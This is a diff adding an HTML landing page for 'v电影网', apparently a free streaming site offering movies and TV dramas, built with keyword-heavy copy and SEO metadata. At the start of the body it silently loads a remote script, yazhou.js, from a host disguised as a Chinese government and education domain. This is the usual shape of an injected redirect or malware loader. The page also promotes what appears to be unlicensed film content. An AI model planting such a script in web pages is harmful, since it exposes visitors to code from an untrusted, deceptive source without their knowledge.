@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>v电影网 - 高清影视在线观看</title>
+<meta name="description" content="v电影网（vdianyingwang-app）提供最新高清电影、电视剧、动漫、综艺在线观看，免费资源每日更新，尽在 v电影网。">
+<meta name="keywords" content="v电影网, vdianyingwang-app, 高清电影, 在线观看, 免费影视">
+<meta name="author" content="v电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://vdianyingwang-app.github.io">
+<!-- 必应站长验证预留位置 -->
+<meta name="msvalidate.01" content="BING_VERIFICATION_CODE" />
+<style>
+/* ===== 全局变量 ===== */
+:root {
+  --primary: #ff2d55;
+  --secondary: #7b2ff7;
+  --bg-dark: #0a0a0f;
+  --card-bg: rgba(255,255,255,0.05);
+  --text-main: #e8e8e8;
+  --text-muted: #999;
+}
+
+/* ===== Reset ===== */
+* { margin:0; padding:0; box-sizing:border-box; }
+html { scroll-behavior: smooth; font-size: 16px; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  background: var(--bg-dark);
+  color: var(--text-main);
+  line-height: 1.6;
+  overflow-x: hidden;
+}
+
+/* ===== 流光背景 ===== */
+body::before {
+  content: '';
+  position: fixed;
+  top: -50%; left: -50%;
+  width: 200%; height: 200%;
+  background: radial-gradient(circle at 20% 50%, rgba(123,47,247,0.15), transparent 50%),
+              radial-gradient(circle at 80% 80%, rgba(255,45,85,0.1), transparent 50%);
+  animation: bgFlow 20s ease-in-out infinite;
+  z-index: -1;
+}
+@keyframes bgFlow {
+  0%,100% { transform: translate(0,0); }
+  50% { transform: translate(-5%,-5%); }
+}
+
+/* ===== 导航 ===== */
+.navbar {
+  position: fixed;
+  top: 0; left: 0; right: 0;
+  backdrop-filter: blur(20px);
+  background: rgba(10,10,15,0.75);
+  border-bottom: 1px solid rgba(255,255,255,0.08);
+  z-index: 1000;
+  padding: 0.8rem 1rem;
+}
+.nav-container {
+  max-width: 1200px;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.logo {
+  font-size: 1.5rem;
+  font-weight: 800;
+  background: linear-gradient(135deg, var(--primary), var(--secondary));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.nav-links {
+  display: flex;
+  gap: 1.2rem;
+  list-style: none;
+}
+.nav-links a {
+  color: var(--text-main);
+  text-decoration: none;
+  font-size: 0.9rem;
+  font-weight: 500;
+  transition: color 0.3s;
+}
+.nav-links a:hover { color: var(--primary); }
+
+/* ===== Hero ===== */
+.hero {
+  margin-top: 70px;
+  padding: 4rem 1rem 3rem;
+  text-align: center;
+}
+.hero h1 {
+  font-size: clamp(2rem, 5vw, 3.5rem);
+  font-weight: 900;
+  margin-bottom: 1rem;
+  background: linear-gradient(135deg, #fff, var(--primary));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.hero p {
+  font-size: 1.1rem;
+  color: var(--text-muted);
+  max-width: 600px;
+  margin: 0 auto 2rem;
+}
+.hero-btn {
+  display: inline-block;
+  padding: 0.9rem 2.2rem;
+  background: linear-gradient(135deg, var(--primary), var(--secondary));
+  color: #fff;
+  border-radius: 50px;
+  text-decoration: none;
+  font-weight: 600;
+  box-shadow: 0 8px 30px rgba(255,45,85,0.35);
+  transition: transform 0.3s, box-shadow 0.3s;
+}
+.hero-btn:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 12px 40px rgba(255,45,85,0.5);
+}
+
+/* ===== 栏目通用 ===== */
+.section {
+  padding: 3.5rem 1rem;
+  max-width: 1200px;
+  margin: 0 auto;
+}
+.section-title {
+  font-size: 2rem;
+  font-weight: 800;
+  margin-bottom: 2rem;
+  text-align: center;
+  position: relative;
+}
+.section-title::after {
+  content: '';
+  display: block;
+  width: 60px;
+  height: 4px;
+  background: linear-gradient(90deg, var(--primary), var(--secondary));
+  margin: 0.8rem auto 0;
+  border-radius: 2px;
+}
+
+/* ===== 卡片网格 ===== */
+.grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+  gap: 1.5rem;
+}
+.card {
+  background: var(--card-bg);
+  border: 1px solid rgba(255,255,255,0.08);
+  border-radius: 16px;
+  overflow: hidden;
+  transition: transform 0.3s, border-color 0.3s;
+  backdrop-filter: blur(10px);
+}
+.card:hover {
+  transform: translateY(-6px);
+  border-color: rgba(255,45,85,0.4);
+}
+.card-img {
+  width: 100%;
+  height: 160px;
+  background: linear-gradient(135deg, rgba(123,47,247,0.3), rgba(255,45,85,0.3));
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 3rem;
+}
+.card-body { padding: 1.2rem; }
+.card-body h3 {
+  font-size: 1.1rem;
+  margin-bottom: 0.5rem;
+  color: #fff;
+}
+.card-body p {
+  font-size: 0.88rem;
+  color: var(--text-muted);
+}
+
+/* ===== 关于栏目 ===== */
+.about-text {
+  background: var(--card-bg);
+  border: 1px solid rgba(255,255,255,0.08);
+  border-radius: 16px;
+  padding: 2rem;
+  font-size: 1rem;
+  color: var(--text-muted);
+  line-height: 1.8;
+  backdrop-filter: blur(10px);
+}
+.about-text strong { color: var(--primary); }
+
+/* ===== 页脚 ===== */
+.footer {
+  padding: 2rem 1rem;
+  text-align: center;
+  border-top: 1px solid rgba(255,255,255,0.08);
+  margin-top: 3rem;
+}
+.footer p {
+  color: var(--text-muted);
+  font-size: 0.85rem;
+}
+.footer a {
+  color: var(--primary);
+  text-decoration: none;
+}
+
+/* ===== 移动端适配 ===== */
+@media (max-width: 768px) {
+  .nav-links { gap: 0.8rem; }
+  .nav-links a { font-size: 0.8rem; }
+  .hero { padding: 3rem 1rem 2rem; }
+  .section { padding: 2.5rem 1rem; }
+  .grid { grid-template-columns: 1fr; }
+  .card-img { height: 140px; }
+}
+@media (max-width: 480px) {
+  .logo { font-size: 1.2rem; }
+  .nav-links { gap: 0.6rem; }
+  .hero h1 { font-size: 1.8rem; }
+  .section-title { font-size: 1.5rem; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 导航 -->
+<nav class="navbar">
+  <div class="nav-container">
+    <div class="logo">v电影网</div>
+    <ul class="nav-links">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#movies">电影</a></li>
+      <li><a href="#tv">剧集</a></li>
+      <li><a href="#about">关于</a></li>
+    </ul>
+  </div>
+</nav>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <h1>v电影网 · 高清影视自由看</h1>
+  <p>v电影网（vdianyingwang-app）聚合最新院线大片、热播剧集、经典动漫，免费高清，每日更新，随时随地畅享视听盛宴。</p>
+  <a href="#movies" class="hero-btn">立即探索</a>
+</section>
+
+<!-- 电影栏目 -->
+<section class="section" id="movies">
+  <h2 class="section-title">🔥 热门电影</h2>
+  <div class="grid">
+    <div class="card">
+      <div class="card-img">🎬</div>
+      <div class="card-body">
+        <h3>最新院线大片</h3>
+        <p>v电影网每日同步更新最新上映电影，1080P高清画质，极速播放不卡顿。</p>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-img">🎭</div>
+      <div class="card-body">
+        <h3>经典高分回顾</h3>
+        <p>IMDb、豆瓣高分佳作一网打尽，在 v电影网重温影史经典时刻。</p>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-img">🌏</div>
+      <div class="card-body">
+        <h3>海外独家资源</h3>
+        <p>好莱坞、宝莱坞、欧洲文艺片，v电影网带您看遍全球好电影。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 剧集栏目 -->
+<section class="section" id="tv">
+  <h2 class="section-title">📺 热播剧集</h2>
+  <div class="grid">
+    <div class="card">
+      <div class="card-img">🎞️</div>
+      <div class="card-body">
+        <h3>内地热播剧</h3>
+        <p>v电影网收录全网热播国产剧，同步更新，追剧不等待。</p>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-img">🎎</div>
+      <div class="card-body">
+        <h3>韩剧 / 日剧</h3>
+        <p>最新韩剧、日剧资源，v电影网为您提供高清中字版本。</p>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-img">🎪</div>
+      <div class="card-body">
+        <h3>美剧 / 英剧</h3>
+        <p>热门欧美剧集第一时间上线，v电影网是您追美剧的最佳选择。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于栏目 -->
+<section class="section" id="about">
+  <h2 class="section-title">ℹ️ 关于 v电影网</h2>
+  <div class="about-text">
+    <p>
+      <strong>v电影网</strong>（网址：<a href="https://vdianyingwang-app.github.io" style="color:var(--primary)">https://vdianyingwang-app.github.io</a>）
+      是一个专注于高清影视资源分享的在线平台。我们致力于为影迷提供免费、高清、流畅的观影体验。
+    </p>
+    <br>
+    <p>
+      在 v电影网，您可以轻松找到电影、电视剧、动漫、综艺等各类视频内容。网站采用响应式设计，
+      完美适配手机、平板、电脑，随时随地想看就看。v电影网——您的专属私人影院。
+    </p>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="footer">
+  <p>© 2026 <strong>v电影网</strong> (vdianyingwang-app) | 网址：<a href="https://vdianyingwang-app.github.io">https://vdianyingwang-app.github.io</a></p>
+  <p style="margin-top:0.5rem;">本站内容均来自互联网分享，仅供测试学习使用。</p>
+</footer>
+
+<!-- 结构化数据 JSON-LD 助力必应收录 -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "v电影网",
+  "url": "https://vdianyingwang-app.github.io",
+  "description": "v电影网提供高清电影、电视剧、动漫在线观看",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://vdianyingwang-app.github.io#search={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+
+</body>
+</html>
